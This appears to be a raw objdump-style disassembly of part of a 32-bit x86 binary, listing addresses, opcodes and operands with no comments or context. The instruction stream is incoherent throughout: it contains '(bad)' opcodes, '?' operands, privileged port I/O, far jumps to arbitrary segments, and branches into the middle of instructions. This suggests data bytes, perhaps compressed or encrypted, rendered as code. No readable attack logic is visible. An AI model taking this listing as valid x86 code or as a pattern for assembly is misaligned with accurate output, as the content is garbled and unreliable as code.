  40a496:	adc    ah,BYTE PTR ds:0xdcc6dcd4
  40a49c:	stc    
  40a49d:	adc    BYTE PTR [esi+eax*8+0x5b],dh
  40a4a1:	xlat   BYTE PTR ds:[ebx]
  40a4a2:	push   edx
  40a4a3:	sbb    BYTE PTR ds:0x36ca5c17,dh
  40a4a9:	mov    bl,BYTE PTR [esi]
  40a4ab:	xor    eax,0x30838500
  40a4b0:	jmp    0x40a491
  40a4b2:	sub    cl,bh
  40a4b4:	enter  0xe763,0x4c
  40a4b8:	popf   
  40a4b9:	pop    es
  40a4ba:	(bad)  
  40a4bc:	je     0x40a4ac
  40a4be:	sahf   
  40a4bf:	ficomp WORD PTR [ebp-0x2]
  40a4c2:	stos   DWORD PTR es:[edi],eax
  40a4c3:	jne    0x40a4d5
  40a4c5:	popf   
  40a4c6:	stos   BYTE PTR es:[edi],al
  40a4c7:	dec    esi
  40a4c8:	pushf  
  40a4c9:	cwde   
  40a4ca:	aas    
  40a4cb:	das    
  40a4cc:	fist   DWORD PTR [eax+0x3]
  40a4cf:	out    dx,al
  40a4d0:	jae    0x40a4f1
  40a4d2:	push   ds
  40a4d3:	push   edi
  40a4d4:	fisttp QWORD PTR [ecx-0x24]
  40a4d7:	mov    ebx,0x1bfd9171
  40a4dc:	out    0xd0,eax
  40a4de:	xchg   ebx,eax
  40a4df:	sub    DWORD PTR [esi],ebp
  40a4e1:	fsub   DWORD PTR [ecx-0x9575f9a]
  40a4e7:	stos   DWORD PTR es:[edi],eax
  40a4e8:	push   0x15
  40a4ea:	mov    DWORD PTR [ecx+0x12],edx
  40a4ed:	inc    eax
  40a4ee:	and    eax,0x4ebddeda
  40a4f3:	adc    eax,DWORD PTR [edi+edx*2-0x7]
  40a4f7:	xor    esp,DWORD PTR [edi]
  40a4f9:	mov    ecx,0xa7d81b8a
  40a4fe:	dec    ecx
  40a4ff:	fild   DWORD PTR [ecx+edi*4+0x74d1abf3]
  40a506:	jmp    0xc0:0x6f80d8e2
  40a50d:	popf   
  40a50e:	dec    ecx
  40a50f:	out    0x15,eax
  40a511:	pusha  
  40a512:	jl     0x40a50c
  40a514:	or     BYTE PTR [esi-0x664f0083],0x6
  40a51b:	inc    edx
  40a51c:	pop    ecx
  40a51d:	adc    cl,bl
  40a51f:	and    DWORD PTR [ecx+0xcd645ff],ebx
  40a525:	in     al,dx
  40a526:	outs   dx,DWORD PTR ds:[esi]
  40a527:	outs   dx,DWORD PTR ds:[esi]
  40a528:	not    BYTE PTR [ebx+0x1a]
  40a52b:	les    esp,FWORD PTR [edx]
  40a52d:	cli    
  40a52e:	dec    eax
  40a52f:	pop    ecx
  40a530:	rcr    BYTE PTR [ecx],0x1d
  40a533:	mov    esp,0xd22cfef8
  40a538:	into   
  40a539:	push   ss
  40a53a:	mov    esp,0x4677f1b1
  40a53f:	xor    ecx,DWORD PTR [ecx-0x36]
  40a542:	inc    edi
  40a543:	pop    es
  40a544:	pop    esi
  40a545:	push   0xfffffff9
  40a547:	das    
  40a548:	lea    edi,[esi]
  40a54a:	inc    bh
  40a54c:	and    dl,BYTE PTR [eax-0x2d]
  40a54f:	jle    0x40a534
  40a551:	pop    ebx
  40a552:	or     al,0xb3
  40a554:	pusha  
  40a555:	inc    ebx
  40a556:	sbb    DWORD PTR [esi+0xa1682aa],eax
  40a55c:	or     bl,ah
  40a55e:	popa   
  40a55f:	imul   esi,DWORD PTR [edx+0x2b5329ef],0x8c60a874
  40a569:	lods   al,BYTE PTR ds:[esi]
  40a56a:	jp     0x40a543
  40a56c:	or     bh,BYTE PTR [edi+0x103ae857]
  40a572:	inc    ecx
  40a573:	ja     0x40a5bb
  40a575:	xor    eax,0x91f01cbd
  40a57a:	and    DWORD PTR [ebp+0x66461696],esp
  40a580:	mov    eax,ds:0xa33b5ec0
  40a585:	cdq    
  40a586:	enter  0xc236,0x63
  40a58a:	iret   
  40a58b:	jl     0x40a547
  40a58d:	xlat   BYTE PTR ds:[ebx]
  40a58e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a58f:	repnz fisubr DWORD PTR [eax]
  40a592:	sbb    edx,esi
  40a594:	pop    esi
  40a595:	jle    0x40a596
  40a597:	push   eax
  40a598:	sbb    eax,0xadd3bdef
  40a59d:	out    0x29,al
  40a59f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5a1:	iret   
  40a5a2:	enter  0x91f8,0xb6
  40a5a6:	and    eax,DWORD PTR [edx*1-0x3aa26510]
  40a5ad:	pop    ds
  40a5ae:	cmp    BYTE PTR [ebp-0x34a7bed1],bl
  40a5b4:	sub    dh,ah
  40a5b6:	sub    BYTE PTR [ebx],0xa9
  40a5b9:	sar    DWORD PTR [eax+0x1ff2b7e4],1
  40a5bf:	ret    
  40a5c0:	out    0x5a,al
  40a5c2:	daa    
  40a5c3:	pop    ebx
  40a5c4:	pop    esi
  40a5c5:	int    0xee
  40a5c7:	add    esp,DWORD PTR [edx+0x7be54d2e]
  40a5cd:	test   al,0x62
  40a5cf:	sbb    ebx,ebp
  40a5d1:	dec    edi
  40a5d2:	hlt    
  40a5d3:	addr16 jp 0x40a5ad
  40a5d6:	push   0x6aa40df2
  40a5db:	lahf   
  40a5dc:	das    
  40a5dd:	call   0xe111:0xc01d9f80
  40a5e4:	pop    edx
  40a5e5:	push   edi
  40a5e6:	xor    al,0x72
  40a5e8:	add    cl,BYTE PTR [ebx+0x77c51d3]
  40a5ee:	sub    DWORD PTR [esi+0x51d74d89],eax
  40a5f4:	sbb    dl,BYTE PTR [ebx]
  40a5f6:	add    DWORD PTR [ecx-0x1063ad0f],edx
  40a5fc:	mov    cl,0xb7
  40a5fe:	and    BYTE PTR [ebx+0xb],dh
  40a601:	shr    BYTE PTR [ebx+0x3],1
  40a604:	not    BYTE PTR [ebp-0x7d0619b3]
  40a60a:	lds    ebp,FWORD PTR [edi-0x52dbb811]
  40a610:	or     DWORD PTR [edx+0x6329a55c],ebp
  40a616:	nop
  40a617:	jmp    DWORD PTR [ebp+0x34410bf3]
  40a61d:	sub    bl,BYTE PTR [ebx-0x51]
  40a620:	mov    ch,0x1
  40a622:	retf   
  40a623:	jbe    0x40a5be
  40a625:	dec    edi
  40a626:	out    dx,eax
  40a627:	out    0x96,al
  40a629:	retf   0xd475
  40a62c:	idiv   ebx
  40a62e:	sub    ch,bl
  40a630:	dec    ah
  40a632:	fidivr WORD PTR [edi+0x22aded6c]
  40a638:	mov    ?,WORD PTR [eax+0x42]
  40a63b:	jmp    0x939a:0xf08df7a
  40a642:	mov    BYTE PTR [ecx],cl
  40a644:	xor    eax,0x58c7bf03
  40a649:	sbb    ebp,ecx
  40a64b:	leave  
  40a64c:	mul    cl
  40a64e:	xchg   edx,eax
  40a64f:	mov    cl,0x82
  40a651:	push   cs
  40a652:	mov    esp,0x41958446
  40a657:	pop    eax
  40a658:	xchg   esi,eax
  40a659:	cmp    eax,0xd45a41f4
  40a65e:	xchg   edi,eax
  40a65f:	mov    ebp,DWORD PTR [esi-0x45]
  40a662:	idiv   BYTE PTR [eax]
  40a664:	inc    ebx
  40a665:	fwait
  40a666:	push   es
  40a667:	add    DWORD PTR [ecx-0x20d6e9aa],esi
  40a66d:	push   ds
  40a66e:	sbb    DWORD PTR [ebp-0x22218743],esi
  40a674:	aas    
  40a675:	in     eax,0xe
  40a677:	outs   dx,BYTE PTR ds:[esi]
  40a678:	sbb    al,0xdb
  40a67a:	mov    esp,0xf760f653
  40a67f:	pop    ss
  40a680:	into   
  40a681:	aad    0xba
  40a683:	dec    eax
  40a684:	pop    ds
  40a685:	adc    ebx,DWORD PTR [ecx+0x5e]
  40a688:	fcmovnb st,st(1)
  40a68a:	loope  0x40a692
  40a68c:	ret    
  40a68d:	aad    0x47
  40a68f:	dec    ecx
  40a690:	xor    esi,DWORD PTR [esi]
  40a692:	pop    esp
  40a693:	pop    edx
  40a694:	(bad)  
  40a695:	pop    ss
  40a696:	push   ecx
  40a697:	int    0x7
  40a699:	(bad)  
  40a69a:	in     eax,0x3f
  40a69c:	stos   DWORD PTR es:[edi],eax
  40a69d:	jbe    0x40a6d9
  40a69f:	and    DWORD PTR [esi+ecx*8+0x3a4a70ca],eax
  40a6a6:	mov    BYTE PTR [esi-0x6e],al
  40a6a9:	pop    edx
  40a6aa:	ret    0x3837
  40a6ad:	mov    WORD PTR [esi-0x1518411d],?
  40a6b3:	jl     0x40a6af
  40a6b5:	rol    DWORD PTR [esi-0x5de735c4],1
  40a6bb:	mov    eax,0x61296034
  40a6c0:	mov    al,0x85
  40a6c2:	or     ebp,DWORD PTR [ebp+0x6f]
  40a6c5:	pop    ds
  40a6c6:	mov    eax,gs:0x94a7f243
  40a6cc:	xor    ebx,DWORD PTR [ebx+0x7212d653]
  40a6d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6d3:	dec    esp
  40a6d4:	xchg   edx,eax
  40a6d5:	int    0x7a
  40a6d7:	pusha  
  40a6d8:	add    BYTE PTR [esi-0x1638fca0],dl
  40a6de:	sbb    al,0x3
  40a6e0:	add    BYTE PTR [eax],al
  40a6e2:	in     eax,0x96
  40a6e4:	not    BYTE PTR [ebp+esi*2+0x15776574]
  40a6eb:	sub    dh,BYTE PTR [eax+edi*4+0x8]
  40a6ef:	cmp    ch,BYTE PTR [ebx+0x7ee9788a]
  40a6f5:	jle    0x40a771
  40a6f7:	jge    0x40a777
  40a6f9:	jle    0x40a68b
  40a6fb:	lods   al,BYTE PTR ds:[esi]
  40a6fc:	pusha  
  40a6fd:	aaa    
  40a6fe:	dec    ebp
  40a6ff:	jmp    0x40a77f
  40a701:	adc    ebx,DWORD PTR [ebx-0x11]
  40a704:	xchg   BYTE PTR [ebx+0x5526496d],dh
  40a70a:	push   edx
  40a70b:	std    
  40a70c:	fstp   TBYTE PTR ds:0xa55deeae
  40a712:	or     DWORD PTR [edx],0xbac693e0
  40a718:	(bad)  
  40a719:	xchg   esp,eax
  40a71a:	enter  0x1a52,0xbd
  40a71e:	mov    cl,0x90
  40a720:	(bad)  [eax+ebp*1+0x4e]
  40a724:	xchg   ebx,eax
  40a725:	inc    edi
  40a726:	cld    
  40a727:	mov    ecx,0xd7bc8cd2
  40a72c:	push   0xffffffe0
  40a72e:	cli    
  40a72f:	cmc    
  40a730:	inc    ecx
  40a731:	pop    ebp
  40a732:	sahf   
  40a733:	out    0x39,eax
  40a735:	lahf   
  40a736:	dec    ebx
  40a737:	ins    BYTE PTR es:[edi],dx
  40a738:	and    DWORD PTR [edx+0x385e301b],ecx
  40a73e:	out    dx,al
  40a73f:	std    
  40a740:	test   cl,bl
  40a742:	and    DWORD PTR [edi+0x3513f12f],esp
  40a748:	sbb    BYTE PTR [edi-0x1fb82ee4],cl
  40a74e:	and    eax,0x83f50533
  40a753:	cmp    dl,BYTE PTR [edx]
  40a755:	mov    ss:0x328033fb,eax
  40a75b:	icebp  
  40a75c:	pop    ss
  40a75d:	sbb    bh,bh
  40a75f:	pop    ebp
  40a760:	dec    esi
  40a761:	enter  0x51fb,0xb4
  40a765:	mov    cl,0x7b
  40a767:	outs   dx,DWORD PTR ds:[esi]
  40a768:	sub    ebp,DWORD PTR [edi-0x9]
  40a76b:	inc    edx
  40a76c:	mov    ds,WORD PTR ds:0x1f0099f3
  40a772:	lods   al,BYTE PTR ds:[esi]
  40a773:	mov    cl,0xa5
  40a775:	pop    esp
  40a776:	clts   
  40a778:	push   0xa51793a0
  40a77d:	loopne 0x40a7ae
  40a77f:	loope  0x40a71d
  40a781:	(bad)  [edx+0x64]
  40a784:	inc    ebp
  40a785:	push   esi
  40a786:	xchg   BYTE PTR [ecx+eax*2-0x6e62ad71],bl
  40a78d:	mov    ah,0x70
  40a78f:	das    
  40a790:	push   esp
  40a791:	out    dx,eax
  40a792:	hlt    
  40a793:	jmp    0xd8910061
  40a798:	(bad)  
  40a799:	ja     0x40a7d3
  40a79b:	cmp    bh,0x9b
  40a79e:	loope  0x40a7a7
  40a7a0:	out    0x2f,al
  40a7a2:	pop    eax
  40a7a3:	std    
  40a7a4:	ins    BYTE PTR es:[edi],dx
  40a7a5:	dec    edi
  40a7a6:	dec    edi
  40a7a7:	push   edi
  40a7a8:	adc    al,0x53
  40a7aa:	fwait
  40a7ab:	out    dx,eax
  40a7ac:	cmp    al,0x98
  40a7ae:	aad    0xc6
  40a7b0:	sub    BYTE PTR [ebx+0x63],0x8d
  40a7b4:	xor    edx,edi
  40a7b6:	dec    ebp
  40a7b7:	test   DWORD PTR [esi-0xa],0x89df9d04
  40a7be:	push   ecx
  40a7bf:	jge    0x40a77b
  40a7c1:	sbb    al,0x2a
  40a7c3:	scas   eax,DWORD PTR es:[edi]
  40a7c4:	scas   al,BYTE PTR es:[edi]
  40a7c5:	dec    ebp
  40a7c6:	loope  0x40a788
  40a7c8:	and    ah,BYTE PTR [ecx-0x2b86bdb7]
  40a7ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7cf:	loop   0x40a811
  40a7d1:	xor    eax,0xe2f17328
  40a7d6:	pop    ds
  40a7d7:	pop    esi
  40a7d8:	not    cl
  40a7da:	ret    0x7adc
  40a7dd:	fcom   DWORD PTR [ebp-0x42]
  40a7e0:	call   0x3f06503a
  40a7e5:	dec    ebx
  40a7e6:	sbb    DWORD PTR [ebx],edx
  40a7e8:	dec    esp
  40a7e9:	mov    al,ds:0xab9bc58a
  40a7ee:	fwait
  40a7ef:	jae    0x40a7e1
  40a7f1:	test   eax,0xd4f4f865
  40a7f6:	push   ebx
  40a7f7:	loope  0x40a808
  40a7f9:	lock repnz add bl,BYTE PTR [edi]
  40a7fd:	fist   WORD PTR [edi-0x185821b2]
  40a803:	cmp    ch,BYTE PTR [edx+0x4d]
  40a806:	dec    ebp
  40a807:	test   BYTE PTR [edx-0x183548e7],ch
  40a80d:	push   ss
  40a80e:	fnstenv ds:0x36dcb4bf
  40a814:	adc    esi,DWORD PTR [esi]
  40a816:	mov    ds:0x7a8f64a4,al
  40a81b:	aad    0x91
  40a81d:	sbb    eax,0xe7f1a0e6
  40a822:	(bad)  
  40a823:	call   0x5ea6:0xa6b80186
  40a82a:	inc    ecx
  40a82b:	inc    eax
  40a82c:	jmp    0x40a8ad
  40a82e:	xchg   BYTE PTR [ecx-0x744856d3],dl
  40a834:	inc    esp
  40a835:	imul   edx,DWORD PTR [edi-0x7d],0x56
  40a839:	xchg   ebx,eax
  40a83a:	fbstp  TBYTE PTR [ecx-0x1c0f3a58]
  40a840:	and    BYTE PTR [esi],ch
  40a842:	xor    ebx,edx
  40a844:	in     eax,0xcb
  40a846:	ja     0x40a832
  40a848:	aas    
  40a849:	mov    al,0x5b
  40a84b:	xchg   DWORD PTR [edi],ebp
  40a84d:	mov    BYTE PTR [edi],0x1f
  40a850:	rcr    BYTE PTR [edx],cl
  40a852:	loop   0x40a7fa
  40a854:	mov    ah,0x9a
  40a856:	add    eax,0xbb630a8e
  40a85b:	xor    DWORD PTR [ebx+0x1f],0xffffffe9
  40a85f:	and    dh,ah
  40a861:	xor    BYTE PTR [edx+0x78],cl
  40a864:	and    BYTE PTR [esp+eax*2-0x4],dl
  40a868:	add    dl,BYTE PTR [eax-0xfa125d2]
  40a86e:	xor    DWORD PTR [ecx-0x2e],ecx
  40a871:	imul   eax,DWORD PTR [edi+0x28],0xffffff98
  40a875:	jb     0x40a8db
  40a877:	cmp    esi,ecx
  40a879:	iret   
  40a87a:	sub    BYTE PTR [esi],cl
  40a87c:	test   al,0xbc
  40a87e:	xor    BYTE PTR [eax],0x2a
  40a881:	fistp  QWORD PTR [eax-0x1090ff81]
  40a887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a888:	jo     0x40a823
  40a88a:	jbe    0x40a88d
  40a88c:	inc    esi
  40a88d:	sbb    ebx,edx
  40a88f:	mov    ch,0xf9
  40a891:	stc    
  40a892:	or     eax,0xe2e249b4
  40a897:	mov    esp,0x8c50e73a
  40a89c:	mov    ch,0x93
  40a89e:	jmp    0xb9613e53
  40a8a3:	mov    BYTE PTR [ebp+0x1b90c0a8],cl
  40a8a9:	(bad)  
  40a8aa:	dec    edx
  40a8ab:	scas   eax,DWORD PTR es:[edi]
  40a8ac:	pop    ecx
  40a8ad:	arpl   WORD PTR [edx-0x720fbf5b],di
  40a8b3:	xchg   edi,eax
  40a8b4:	not    bh
  40a8b6:	lds    esp,FWORD PTR [ebx-0x46680e4]
  40a8bc:	stos   BYTE PTR es:[edi],al
  40a8bd:	jle    0x40a8d9
  40a8bf:	stos   DWORD PTR es:[edi],eax
  40a8c0:	jo     0x40a860
  40a8c2:	lods   eax,DWORD PTR ds:[esi]
  40a8c3:	dec    esi
  40a8c4:	push   ds
  40a8c5:	or     BYTE PTR [eax],ch
  40a8c7:	int3   
  40a8c8:	mov    ebx,0x8a9c7091
  40a8cd:	call   0xb622:0x3e32ddf1
  40a8d4:	pushf  
  40a8d5:	xchg   ecx,eax
  40a8d6:	add    ecx,edi
  40a8d8:	mov    esp,0xdbc632e1
  40a8dd:	mov    al,ds:0xa4f8aa89
  40a8e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8e3:	sub    BYTE PTR [edx-0x57a360d4],cl
  40a8e9:	daa    
  40a8ea:	xchg   esp,eax
  40a8eb:	sbb    al,BYTE PTR [eax+0x7ce5d327]
  40a8f1:	adc    bh,BYTE PTR [ebx]
  40a8f3:	mov    cl,0xb3
  40a8f5:	aad    0x51
  40a8f7:	call   FWORD PTR [ebp+0x4cfb1ad5]
  40a8fd:	push   ds
  40a8fe:	ds push eax
  40a900:	and    dl,dl
  40a902:	sti    
  40a903:	div    ebx
  40a905:	inc    edx
  40a906:	jae    0x40a8fc
  40a908:	jecxz  0x40a8fb
  40a90a:	into   
  40a90b:	and    eax,0xece2d48b
  40a910:	stos   DWORD PTR es:[edi],eax
  40a911:	mov    esp,0xfc020064
  40a916:	call   0x2816:0xd8e2aa96
  40a91d:	imul   edx,DWORD PTR [eax-0x70],0x38ceec19
  40a924:	fsub   st(0),st
  40a926:	cmp    eax,0x9e2067e9
  40a92b:	push   esp
  40a92c:	sbb    eax,0xf0518f5f
  40a931:	in     al,dx
  40a932:	mov    ebp,0x454c2299
  40a937:	stc    
  40a938:	mov    edx,0xdc56be4b
  40a93d:	int    0xc6
  40a93f:	xchg   BYTE PTR ds:0x15269701,bh
  40a945:	xchg   edi,eax
  40a946:	dec    eax
  40a947:	leave  
  40a948:	pop    esi
  40a949:	adc    DWORD PTR [eax+0x56],esp
  40a94c:	add    BYTE PTR [edi],bh
  40a94e:	fst    DWORD PTR [ecx+0x35f1f3f9]
  40a954:	int3   
  40a955:	or     ecx,DWORD PTR [esi]
  40a957:	cmp    DWORD PTR [ebp+0x5a6d66a6],0x5b
  40a95e:	outs   dx,BYTE PTR ds:[esi]
  40a95f:	mov    dl,0xff
  40a961:	adc    al,0x15
  40a963:	inc    eax
  40a964:	stos   BYTE PTR es:[edi],al
  40a965:	mov    al,0x16
  40a967:	adc    DWORD PTR [edi-0x360a4040],edx
  40a96d:	in     eax,dx
  40a96e:	mov    ebp,0xc789dc42
  40a973:	test   BYTE PTR [ebx-0x5602a6c5],ch
  40a979:	(bad)  [eax-0x3df3ba9b]
  40a97f:	jge    0x40a95e
  40a981:	std    
  40a982:	mov    dl,0x8b
  40a984:	push   0x3d671b17
  40a989:	inc    esi
  40a98a:	dec    edi
  40a98b:	fwait
  40a98c:	xlat   BYTE PTR ds:[ebx]
  40a98d:	sbb    DWORD PTR [esi+0x2244989e],ecx
  40a993:	nop
  40a994:	ins    BYTE PTR es:[edi],dx
  40a995:	inc    BYTE PTR [esi-0x4]
  40a998:	push   esp
  40a999:	jns    0x40a9ee
  40a99b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a99c:	arpl   WORD PTR [ebp+0x396f7f72],cx
  40a9a2:	pop    edi
  40a9a3:	xor    DWORD PTR [esi-0x47],ebx
  40a9a6:	mov    ebx,0x29a76784
  40a9ab:	dec    ecx
  40a9ac:	xchg   ebx,eax
  40a9ad:	test   eax,0xa4235771
  40a9b2:	xrelease xchg BYTE PTR [ebp+0x5f9cc3d8],al
  40a9b9:	div    bh
  40a9bb:	adc    bh,BYTE PTR [ecx+0x774252e2]
  40a9c1:	pop    esi
  40a9c2:	sti    
  40a9c3:	arpl   bp,si
  40a9c5:	sub    esp,edx
  40a9c7:	sti    
  40a9c8:	call   0xb9a1c87a
  40a9cd:	jnp    0x40a9c1
  40a9cf:	test   ecx,0xaed95995
  40a9d5:	push   edx
  40a9d6:	shr    BYTE PTR [esi+0x64053e4a],0x5a
  40a9dd:	cmp    eax,0xcb28f352
  40a9e2:	push   ebp
  40a9e3:	sub    al,bl
  40a9e5:	push   edx
  40a9e6:	or     DWORD PTR [esi+0x31],esp
  40a9e9:	push   es
  40a9ea:	loop   0x40a9a3
  40a9ec:	setb   cl
  40a9ef:	inc    ebp
  40a9f0:	jg     0x40a9d8
  40a9f2:	pop    ebp
  40a9f3:	hlt    
  40a9f4:	aam    0xbb
  40a9f6:	stos   BYTE PTR es:[edi],al
  40a9f7:	mov    al,dh
  40a9f9:	outs   dx,DWORD PTR ds:[esi]
  40a9fa:	ins    BYTE PTR es:[edi],dx
  40a9fb:	inc    edx
  40a9fc:	ins    BYTE PTR es:[edi],dx
  40a9fd:	bound  edi,QWORD PTR [ecx]
  40a9ff:	add    DWORD PTR [edi],ecx
  40aa01:	test   BYTE PTR [edx],ah
  40aa03:	adc    BYTE PTR [eax],al
  40aa05:	add    BYTE PTR [ebx+0x458bec4d],cl
  40aa0b:	clc    
  40aa0c:	mov    eax,DWORD PTR [eax]
  40aa0e:	mov    eax,DWORD PTR [eax+0x3c]
  40aa11:	lea    ecx,[ecx*8+0x78]
  40aa18:	jmp    0x40ad39
  40aa1d:	dec    ebx
  40aa1e:	mov    bl,BYTE PTR [edi+0x55]
  40aa21:	pop    edi
  40aa22:	jno    0x40aa95
  40aa24:	nop
  40aa25:	retf   0x4daf
  40aa28:	add    DWORD PTR [ebx-0x4f],ebx
  40aa2b:	xchg   bh,bl
  40aa2d:	add    al,0xf4
  40aa2f:	jle    0x40aaaf
  40aa31:	jp     0x40aab0
  40aa33:	jle    0x40aab3
  40aa35:	stos   DWORD PTR es:[edi],eax
  40aa36:	data16 fisub WORD PTR [edx-0x62dff1d5]
  40aa3d:	adc    BYTE PTR [ebp+ecx*2-0x1f9971be],dh
  40aa44:	or     edi,eax
  40aa46:	cmp    ah,BYTE PTR [eax-0x1e]
  40aa49:	adc    eax,0x88c17ee7
  40aa4e:	dec    edi
  40aa4f:	jle    0x40aa5b
  40aa51:	(bad)
  40aa54:	xor    BYTE PTR [eax],bh
  40aa56:	cmp    cl,BYTE PTR [edx+0x3]
  40aa59:	dec    ebx
  40aa5a:	cli    
  40aa5b:	sub    BYTE PTR [esp+ecx*4],ch
  40aa5e:	sahf   
  40aa5f:	sub    esp,DWORD PTR ds:0xf4464c89
  40aa65:	pop    ebx
  40aa66:	and    DWORD PTR [ecx-0x60],ebx
  40aa69:	and    BYTE PTR [edx],0x71
  40aa6c:	mov    ds:0x95542e8e,eax
  40aa71:	xchg   edi,eax
  40aa72:	xchg   edi,eax
  40aa73:	aaa    
  40aa74:	xor    eax,0x9f35c146
  40aa79:	add    eax,0x7aa75e80
  40aa7e:	retf   
  40aa7f:	jg     0x40aa49
  40aa81:	ds mov bl,0x96
  40aa84:	or     al,BYTE PTR [eax+0x3a2b2332]
  40aa8a:	rcr    BYTE PTR [edx+edi*8+0x65],1
  40aa8e:	mov    ebp,edi
  40aa90:	mul    BYTE PTR [ecx+0x2b]
  40aa93:	xchg   ebp,eax
  40aa94:	add    DWORD PTR [edx],edx
  40aa96:	sub    al,0xf2
  40aa98:	sahf   
  40aa99:	jmp    0x5542:0xb8943412
  40aaa0:	enter  0x4532,0x71
  40aaa4:	sbb    BYTE PTR [ecx+0x6499e271],al
  40aaaa:	mov    cl,0x24
  40aaac:	xchg   ebp,eax
  40aaad:	cld    
  40aaae:	clc    
  40aaaf:	adc    DWORD PTR [ebx+0x20],0xffffffee
  40aab3:	push   edi
  40aab4:	xchg   esi,eax
  40aab5:	pop    ebx
  40aab6:	xor    bl,BYTE PTR [edi-0x4d]
  40aab9:	test   edi,ecx
  40aabb:	jb     0x40aaa6
  40aabd:	or     esi,0x3b
  40aac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aac1:	and    eax,DWORD PTR [ecx+0xc]
  40aac4:	ret    0xf172
  40aac7:	stos   DWORD PTR es:[edi],eax
  40aac8:	retf   
  40aac9:	lds    esi,FWORD PTR [esp+edx*8]
  40aacc:	inc    esi
  40aacd:	xchg   esp,eax
  40aace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aacf:	js     0x40ab35
  40aad1:	inc    edx
  40aad2:	icebp  
  40aad3:	mov    eax,0xaa7bd905
  40aad8:	ins    DWORD PTR es:[edi],dx
  40aad9:	xchg   ebp,eax
  40aada:	mov    al,ds:0xdb448b54
  40aadf:	xor    al,0xea
  40aae1:	mov    edi,DWORD PTR [edi+edi*1-0xd]
  40aae5:	push   es
  40aae6:	inc    esi
  40aae7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aae8:	mov    eax,ds:0x69a9af0e
  40aaed:	pop    ss
  40aaee:	adc    eax,0xb3d733e8
  40aaf3:	mov    bl,0x7b
  40aaf5:	(bad)  
  40aaf6:	es mov edi,0xce9cfcb6
  40aafc:	gs mov dh,0xb1
  40aaff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab00:	xchg   ebp,eax
  40ab01:	into   
  40ab02:	repnz enter 0xec8c,0xcd
  40ab07:	cs aas 
  40ab09:	test   DWORD PTR [ecx+edi*1-0x4a67ad3b],esi
  40ab10:	sbb    BYTE PTR [ebp-0x21acce98],bl
  40ab16:	pop    esp
  40ab17:	pop    edi
  40ab18:	addr16 jmp 0xa1df7ee2
  40ab1e:	xchg   esp,eax
  40ab1f:	(bad)  
  40ab20:	jbe    0x40aad5
  40ab22:	ins    DWORD PTR es:[edi],dx
  40ab23:	push   ss
  40ab24:	es aas 
  40ab26:	pop    eax
  40ab27:	or     DWORD PTR [ebx+0x64],edi
  40ab2a:	popa   
  40ab2b:	imul   ebp,DWORD PTR [esi],0x3e
  40ab2e:	jno    0x40aaf4
  40ab30:	adc    al,0x3
  40ab32:	das    
  40ab33:	retf   
  40ab34:	data16 sti 
  40ab36:	and    DWORD PTR [ebx-0x3862ade1],eax
  40ab3c:	jp     0x40ab71
  40ab3e:	adc    BYTE PTR [edx+0x6d],0x79
  40ab42:	xlat   BYTE PTR ds:[ebx]
  40ab43:	fldenv [ebp-0x18028fb2]
  40ab49:	fcomip st,st(7)
  40ab4b:	adc    al,0x55
  40ab4d:	push   cs
  40ab4e:	in     al,dx
  40ab4f:	lea    ebx,[ecx]
  40ab51:	hlt    
  40ab52:	das    
  40ab53:	and    edx,DWORD PTR [esp+edi*8+0x595ce326]
  40ab5a:	add    BYTE PTR [edx],dh
  40ab5c:	mov    dl,0xb8
  40ab5e:	push   ecx
  40ab5f:	out    0xda,eax
  40ab61:	cmc    
  40ab62:	imul   edx,DWORD PTR [ebx],0x1a6dde3d
  40ab68:	cmp    cl,BYTE PTR [ecx+0x8]
  40ab6b:	xchg   esp,eax
  40ab6c:	or     eax,0x28be231d
  40ab71:	xchg   edi,eax
  40ab72:	pop    esi
  40ab73:	xchg   ebp,ebx
  40ab75:	mov    BYTE PTR [ecx+0x0],dl
  40ab78:	cmp    esi,DWORD PTR cs:[ebx-0x2e]
  40ab7c:	inc    edi
  40ab7d:	adc    al,0x1b
  40ab7f:	daa    
  40ab80:	add    BYTE PTR es:[edx+0x18fb73d8],dl
  40ab87:	adc    al,0x48
  40ab89:	(bad)  
  40ab8a:	das    
  40ab8b:	add    al,0x13
  40ab8d:	cdq    
  40ab8e:	fstp   QWORD PTR [ebx]
  40ab90:	repz xchg edi,eax
  40ab92:	(bad)  
  40ab93:	xor    bh,BYTE PTR [eax-0xe]
  40ab96:	cmp    ch,BYTE PTR [eax+eax*2]
  40ab99:	pop    ss
  40ab9a:	mov    edi,0xf94a95d
  40ab9f:	rol    BYTE PTR [ebp-0x15],0x56
  40aba3:	sub    bl,BYTE PTR [eax+0x3c6937d5]
  40aba9:	dec    esi
  40abaa:	xor    BYTE PTR [eax-0x7afedb20],dh
  40abb0:	push   edi
  40abb1:	and    ebp,ecx
  40abb3:	sub    esp,ebx
  40abb5:	pop    es
  40abb6:	push   ebp
  40abb7:	inc    esp
  40abb8:	cli    
  40abb9:	pop    esp
  40abba:	fwait
  40abbb:	xchg   ebp,eax
  40abbc:	pop    ebx
  40abbd:	aad    0x97
  40abbf:	icebp  
  40abc0:	add    eax,0xbbec0376
  40abc5:	rol    DWORD PTR [esi+0x54e34875],0x84
  40abcc:	shl    DWORD PTR [eax],1
  40abce:	popa   
  40abcf:	(bad)  
  40abd0:	xlat   BYTE PTR ds:[ebx]
  40abd1:	data16 fwait
  40abd3:	pop    esp
  40abd4:	push   ecx
  40abd5:	test   eax,0xc2389743
  40abda:	ins    DWORD PTR es:[edi],dx
  40abdb:	sar    edi,1
  40abdd:	cmp    al,0x97
  40abdf:	xchg   ecx,eax
  40abe0:	daa    
  40abe1:	or     eax,0x8fc419c6
  40abe6:	pop    DWORD PTR [edx]
  40abe8:	and    eax,0xfca28091
  40abed:	loopne 0x40ab6f
  40abef:	popa   
  40abf0:	push   edx
  40abf1:	repz ficomp DWORD PTR [eax-0x5d]
